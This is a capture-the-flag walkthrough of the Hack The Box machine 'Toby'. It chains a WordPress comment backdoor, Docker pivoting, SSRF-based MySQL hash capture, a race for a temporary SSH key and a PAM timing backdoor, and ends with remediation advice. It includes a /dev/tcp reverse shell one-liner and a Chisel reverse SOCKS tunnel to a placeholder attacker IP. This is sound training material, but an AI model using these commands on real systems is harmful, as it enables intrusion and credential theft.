---
title: "Toby HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T06:00:00Z
tags: ["insane-linux", "web", "wordpress", "gogs", "docker", "backdoor", "pam", "timing-attack", "privilege-escalation", "mysql", "ssrf"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Toby HTB machine featuring WordPress backdoor exploitation, Docker container pivoting, PAM backdoor discovery, and timing-based privilege escalation"
---

# Toby HTB - Insane Linux Box Walkthrough

{{< youtube XROkuXKgeg8 >}}

## Exploitation Steps

1. **Initial Reconnaissance with Nmap**: Performed an Nmap scan (`nmap -sC -sV -oA toby 10.10.11.121`) to identify open ports: SSH (22) and HTTP (80) on an Ubuntu server running Nginx and WordPress.

2. **Host File Modification and Website Access**: Added `wordpress.toby.htb` to `/etc/hosts` to access the WordPress blog, which mentioned a prior attack and recovery from the cloud.

3. **Subdomain Enumeration**: Used Gobuster (`gobuster vhost -u http://toby.htb -w /opt/seclists/Discovery/DNS/subdomains-top1million-20000.txt`) to discover `backup.toby.htb`, a Gogs instance.

4. **Gogs Registration and Enumeration**: Registered an account on Gogs, identified user `toby-admin`, and brute-forced repositories using Gobuster (`gobuster dir -u http://backup.toby.htb/toby-admin -w /opt/seclists/Discovery/Web-Content/raft-small-words.txt`) to find the hidden `/backup` repository.

5. **Repository Cloning and Code Analysis**: Cloned the backup repository (`git clone http://backup.toby.htb/toby-admin/backup`), extracted WordPress source code, found DB credentials in `wp-config.php`, but login failed. Scanned for malware using a PHP scanner, identified obfuscated backdoor in `comment.php`.

6. **Backdoor Deobfuscation**: Decoded the backdoor code (base64, rot13, gzip) by iteratively replacing `eval` with `print` in a scripted loop, revealing a command execution mechanism triggered via specific comment form inputs (author: `help@toby.htb`, URL: `test.toby.htb`, comment starting with `746f6279` followed by host;secret).

7. **Triggering Backdoor and Reverse Shell**: Posted a crafted comment, captured reverse connection on port 20053 using Wireshark and Netcat, decoded XOR-encrypted handshake, scripted Python backdoor handler (`bd.py`) to send commands, executed reverse shell (`bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&1`) landing in a Docker container (WordPress).

8. **Internal Network Enumeration**: In the container, enumerated internal IPs via `/proc/net/arp` and `/proc/net/tcp` (decoded hex IPs), identified network range (172.69.0.100-104).

9. **SOCKS Proxy Setup with Chisel**: Downloaded and ran Chisel server locally, client in container (`./chisel client [ATTACKER-IP]:8001 R:socks`), set up SOCKS5 proxy on port 1080 for internal access via Proxychains and browser.

10. **Internal Service Exploration**: Accessed internal hosts via proxy; found personal web app on 172.69.0.104 with password generator (`/api/password`) and notes.

11. **WordPress DB Dumping**: Used MySQL client via proxy to connect to DB (host: mysql.toby.htb at 172.69.0.102, creds from wp-config.php), dumped WP users and password hashes from `wp_users`.

12. **Hash Cracking**: Cracked hashes using Hashcat (`hashcat --user hashes.txt /opt/wordlists/rockyou.txt`), obtained passwords (`toby:tobykeith1`, `toby-admin:tobykeith1`).

13. **Gogs Access as toby-admin**: Logged into Gogs with cracked creds, downloaded support system DB (SQLite with encrypted blobs) and personal web app source (Flask app).

14. **Decrypting Support DB (Optional Hint)**: Dumped SQLite schema, extracted encryption keys/IV/mode (AES-CBC) from `encryption_meta`, decrypted blobs in CyberChef, revealed hints about slow authentication post-attack.

15. **Exploiting DB Test Endpoint**: In personal web app, triggered `/api/db_test?secret_db_test=9ef=<attacker_ip>` to force MySQL connection attempt, captured auth traffic in Wireshark.

16. **MySQL Hash Extraction and Cracking**: Extracted MySQL native password hash and salts from Wireshark, created custom wordlist based on app's password generator (seeded by epoch times around July 2021), cracked with Hashcat (mode 11200) to get `jack`'s password (`f0Rdi3_and_Gr33n_TracT0Rs!!!`).

17. **SSH to MySQL Container**: Used cracked password to SSH into MySQL container (172.69.0.102) as `jack`.

18. **Process Monitoring with pspy**: Ran pspy in container to observe cron jobs dumping DB and SSHing backups using temporary private key in `/tmp`.

19. **Key Extraction via Race Condition**: Scripted Bash loop (`while [ $? -ne 0 ]; do cat /tmp/*/key 2>/dev/null; done`) to capture temporary SSH private key.

20. **SSH to Host**: Used captured key (`ssh -i jack.key jack@[TARGET-IP]`) to access main host as `jack`, obtained user flag.

21. **PAM Backdoor Discovery**: Enumerated filesystem timestamps (`find / -type f -printf "%T+\n" | sort | uniq -c`), identified suspicious `/usr/lib/x86_64-linux-gnu/security/mypam.so` and `/etc/.bd`.

22. **Reverse Engineering PAM Module**: Copied `mypam.so` locally, analyzed in Ghidra: revealed backdoor password check from `/etc/.bd` with timing side-channel (0.1s sleep per correct character).

23. **Timing-Based Brute Force**: Generated charset wordlist (letters, digits, punctuation), scripted Bash loop with `time` to measure `su` delays, brute-forced password character-by-character (padding to 10 chars), obtained backdoor password (`TiHaqP4pse`).

24. **Privilege Escalation to Root**: Used backdoor password with `su -` to gain root access, obtained root flag.

## Security Gaps and Remediation

This machine demonstrates multiple critical security vulnerabilities across different services:

### Web Server (Nginx with WordPress)
- **Backdoor in comment.php**: Obfuscated malicious code (base64, rot13, gzip) allows remote code execution via crafted comments with specific author, URL, and comment patterns that trigger a reverse connection and command execution.
  - **Fix**: Source code fix - Remove the eval-based backdoor code from comment.php and implement proper input sanitization/validation for comment fields using WordPress hooks like `preprocess_comment` to prevent arbitrary code injection.
- **Exposed Absolute URLs**: WordPress uses absolute URLs leading to subdomain exposure (e.g., wordpress.toby.htb).
  - **Fix**: Configuration fix - Configure WordPress site URL and home URL in wp-config.php or settings to use relative paths where possible, or ensure proper redirects and virtual host configurations in Nginx to handle subdomain resolutions securely.
- **Running on Non-Standard Server (Nginx instead of Apache)**: Unusual setup noted, potentially leading to misconfigurations.
  - **Fix**: Configuration fix - Audit and standardize Nginx configuration (e.g., in /etc/nginx/sites-available/) to enforce security headers (e.g., Content-Security-Policy), disable directory listing, and restrict allowed methods.
- **Weak Database Credentials Hardcoded**: Password exposed in wp-config.php from backup.
  - **Fix**: Source code/configuration fix - Use environment variables or a secrets manager (e.g., via define('DB_PASSWORD', getenv('DB_PASS')); in wp-config.php) instead of hardcoding credentials.

### Gogs (Git Service)
- **Unlisted Repository Brute-Forceable**: Hidden repositories (e.g., /toby-admin/backup) discoverable via directory brute-forcing due to case-insensitivity in URLs.
  - **Fix**: Configuration fix - Set repositories to private in Gogs config (app.ini under [repository] section, enable require_signin_view = true), and add rate-limiting or CAPTCHA for unauthenticated accesses.
- **User Enumeration and Activity Exposure**: Public user profiles (e.g., toby-admin) reveal join dates and allow repository guessing.
  - **Fix**: Configuration fix - Disable public user listings in Gogs config (app.ini: [server] DISABLE_REGISTRATION = true if not needed, or set SHOW_USER_EMAIL = false).
- **Backup Repository Containing Sensitive Code**: Source code backup includes full WordPress files with credentials.
  - **Fix**: Source code fix - Implement .gitignore to exclude sensitive files like wp-config.php; configuration fix - Use Gogs hooks or CI to scan and redact sensitive data before commits.

### Docker Environment (Containers and Networking)
- **Internal Network Exposure**: Containers (e.g., WordPress at 172.69.0.101, MySQL at 172.69.0.102) enumerable via /proc/net files, allowing pivoting.
  - **Fix**: Configuration fix - Use Docker network isolation (e.g., --network none for sensitive containers or custom networks with --internal flag) and disable unnecessary proc filesystem mounts in docker run/compose (e.g., --security-opt no-new-privileges).
- **Minimal Container Binaries Leading to Limited Monitoring**: Lack of tools like netstat, ss, ifconfig in containers hinders detection but exposes via direct /proc access.
  - **Fix**: Configuration fix - Use hardened Docker images (e.g., alpine-based with only necessary packages) but add security auditing tools if needed; implement container orchestration (e.g., Kubernetes) with network policies.
- **Backdoored Entry Point Script**: entrypoint.sh in WordPress container copies backdoored comment.php.
  - **Fix**: Source code fix - Remove malicious copy commands from entrypoint.sh and use official WordPress Docker images without modifications.
- **Executable Permissions in Non-Exec Mounts**: Chisel execution denied in /dev/shm due to noexec, but movable to /tmp.
  - **Fix**: Configuration fix - Mount /tmp and /dev/shm with noexec in Docker (via --tmpfs /tmp:noexec in run command or volumes in compose).

### Personal Web App (Flask)
- **SSRF in DB Test Endpoint**: /api/db_test allows arbitrary host injection via secret_db_test parameter, leading to MySQL connection attempts and credential exposure.
  - **Fix**: Source code fix - Validate input in app.py (e.g., if not re.match(r'^172\.69\.\d+\.\d+', hostname): return 'Invalid'; ) to restrict to internal IPs.
- **Predictable Password Generation**: /api/password seeds random with time-based epoch, brute-forceable.
  - **Fix**: Source code fix - Use cryptographically secure random (e.g., import secrets; secrets.token_hex(16)) instead of random.seed(time-based).
- **Hardcoded/Environment-Stored Credentials**: Comments note creds moved to environment, but still accessible via SSRF.
  - **Fix**: Configuration fix - Use a secrets vault (e.g., integrate with HashiCorp Vault) or ensure environment variables are not leaked via debug endpoints.
- **External Resource Loading**: App loads from Cloudflare, potentially allowing MITM or tracking.
  - **Fix**: Configuration fix - Serve assets locally or use Subresource Integrity (SRI) in HTML templates.

### MySQL Database
- **Exposed to Internal Network**: Accessible from other containers via proxy, with root creds.
  - **Fix**: Configuration fix - Bind MySQL to localhost in my.cnf ([mysqld] bind-address=127.0.0.1) and use Docker networks to restrict access.
- **Weak Passwords and Hashes**: Cracked via Hashcat, including MySQL native hashes.
  - **Fix**: Configuration fix - Enforce strong password policies in MySQL (e.g., ALTER USER 'root' IDENTIFIED BY 'strongpass'; ) and use stronger hashing if custom.
- **Temporary File Race Condition in Backup Script**: Cron dumps DB and creates temp private key, extractable via loop.
  - **Fix**: Source code fix - Use atomic file creation (e.g., mktemp -u for unique temps, or ssh with -o BatchMode=yes to avoid temp files); configuration fix - Run backups as a lower-priv user.

### SSH Service
- **Private Key Exposure via Temp Files**: Key temporarily written during automated SSH backups.
  - **Fix**: Configuration fix - Use SSH agent forwarding or keyless methods (e.g., ssh -o IdentitiesOnly=yes); avoid writing keys to disk.
- **Known Hosts Editing During Attack**: Indicates unauthorized access or key injection.
  - **Fix**: Configuration fix - Enable StrictHostKeyChecking=yes in /etc/ssh/ssh_config and monitor/rotate host keys regularly.
- **Password Authentication Allowed**: Permits brute-forcing if enabled.
  - **Fix**: Configuration fix - Set PasswordAuthentication no in /etc/ssh/sshd_config to force key-based auth.

### PAM Authentication System
- **Malicious Custom Module (mypam.so)**: Backdoor checks /etc/.bd for password with per-character sleep, enabling timing-based brute-force.
  - **Fix**: Configuration fix - Remove mypam.so from /usr/lib/x86_64-linux-gnu/security/ and audit /etc/pam.d/ files to remove references (e.g., grep -r mypam /etc/pam.d/ and delete lines).
- **Timing Side-Channel in Auth**: Sleeps introduce delays for correct chars.
  - **Fix**: Source code fix - If retaining custom module, use constant-time comparisons (e.g., via hmac.compare_digest in Python equiv) instead of char-by-char with sleeps.
- **Hidden Backdoor File (/etc/.bd)**: Dotfile with backdoor password, only root-readable.
  - **Fix**: Configuration fix - Remove the file and add filesystem monitoring (e.g., via auditd rules for /etc/).

### General System Issues
- **Weak User Passwords**: Cracked with rockyou.txt or custom lists.
  - **Fix**: Configuration fix - Enforce password complexity via /etc/security/pwquality.conf (e.g., minlen=12, dcredit=-1).
- **Outdated or Unaudited Timestamps**: Files like mypam.so stand out due to timestamps.
  - **Fix**: Configuration fix - Implement file integrity monitoring (e.g., AIDE or Tripwire) to detect changes.
- **Encrypted Data with Keys in Same DB**: Support system SQLite stores keys/IV in encryption_meta table.
  - **Fix**: Source code fix - Use external key management (e.g., derive keys from user passwords or env vars, not stored in DB).

## Conclusion

Toby is an excellent machine that demonstrates the complexity of modern attack chains involving multiple technologies. It requires expertise in:
- WordPress backdoor analysis and exploitation
- Docker container networking and pivoting
- Custom protocol analysis and reverse engineering
- Timing-based attacks and side-channel exploitation
- PAM module analysis and system-level backdoors
- Memory forensics and race condition exploitation

The machine emphasizes the importance of secure development practices, proper container isolation, system integrity monitoring, and the dangers of custom authentication mechanisms.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*